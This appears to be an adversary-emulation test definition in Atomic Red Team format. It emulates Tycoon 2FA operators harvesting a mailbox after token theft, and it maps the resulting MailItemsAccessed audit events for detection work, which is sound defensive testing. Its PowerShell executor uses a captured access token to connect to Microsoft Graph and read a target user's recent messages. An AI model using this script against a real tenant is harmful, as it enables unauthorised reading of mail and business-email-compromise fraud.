# LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
attack_technique: T1114.002
display_name: "AiTM – Tycoon 2FA Mailbox Harvesting via Graph (MailItemsAccessed)"
_mapping_confidence: medium
_mapping_confidence_rationale: "Microsoft TI attributes mailbox harvesting to Tycoon post-capture operators; specific Graph endpoint confirmed from Microsoft Learn, but depth of enumeration (folder count, top-N) not stated per-kit."
_citations:
  - claim_type: identity_attack_flows
    source_url: https://www.microsoft.com/en-us/security/blog/2026/03/inside-tycoon2fa-adversary-in-the-middle-phishing-kit/
    quote_or_anchor: "Inside Tycoon2FA -- post-session-capture operators access victim mailbox for BEC targeting and intelligence collection (verify URL slug)"
  - claim_type: entra_telemetry
    source_url: https://learn.microsoft.com/en-us/purview/audit-mailitemsaccessed
    quote_or_anchor: "MailItemsAccessed audit event: Operations='MailItemsAccessed', RecordType=50, ClientInfoString contains 'Graph'"
# Sufficiency: Microsoft TI is tier_1 with identity_attack_flows in grounds -- sufficient alone for medium.

# Promotion target: consolidate into atomics/T1114.002-mail-items-accessed/T1114.002-mail-items-accessed.yaml
#   Add Tycoon variant to atomic_tests[]. Existing entry is generic;
#   this variant adds Tycoon-specific framing and EXO-pivot token dependency.

atomic_tests:
  - name: "Tycoon 2FA variant -- mailbox harvest via Graph post-AiTM-capture"
    auto_generated_guid: "00000000-0000-0000-0000-000000000000"  # regenerate at promotion
    description: |
      Emulates Tycoon 2FA operator mailbox harvesting after session cookie capture
      and FOCI pivot to Exchange Online. Operator reads recent messages to identify
      financial threads, executive contacts, and ongoing wire-transfer discussions
      for BEC follow-on. Generates MailItemsAccessed events in UAL (E5 required).
    supported_platforms: [windows]
    auth_profile: graph-delegated
    input_arguments:
      token_cache_path:
        description: "Path to an EXO/Graph-scoped token cache from T1550.001 step."
        type: Path
        default: "#{token_cache_path}"
      target_user_id:
        description: "UPN or object ID of the compromised mailbox."
        type: String
      message_count:
        description: "Number of recent messages to read."
        type: Integer
        default: "10"
      output_path:
        description: "Path to write sampled message subjects (lab evidence)."
        type: Path
        default: "tacklebox-tycoon-mail-harvest.json"
    executor:
      name: powershell
      command: |
        # LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
        # wrap-tool: dependencies/manifests/microsoft-graph.json
        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

        $messages = Get-MgUserMessage `
            -UserId '#{target_user_id}' `
            -Top #{message_count} `
            -Select 'id,subject,receivedDateTime,sender,hasAttachments'

        $messages | Select-Object Subject, ReceivedDateTime, HasAttachments,
            @{N='From'; E={$_.Sender.EmailAddress.Address}} |
            ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'

        Write-Host "Accessed $($messages.Count) mail item(s) for '#{target_user_id}'."
    cleanup_command: |
      if (Test-Path -LiteralPath '#{output_path}') {
          Remove-Item -LiteralPath '#{output_path}' -Force
      }
    expected_telemetry:
      - source: ual
        within_minutes: 30
        match:
          Operations: "MailItemsAccessed"
          ClientInfoString: "Graph"
    exercises_chokepoint:
      id: CP-TODO
      url: https://iimp0ster.github.io/detection-chokepoints/CP-TODO
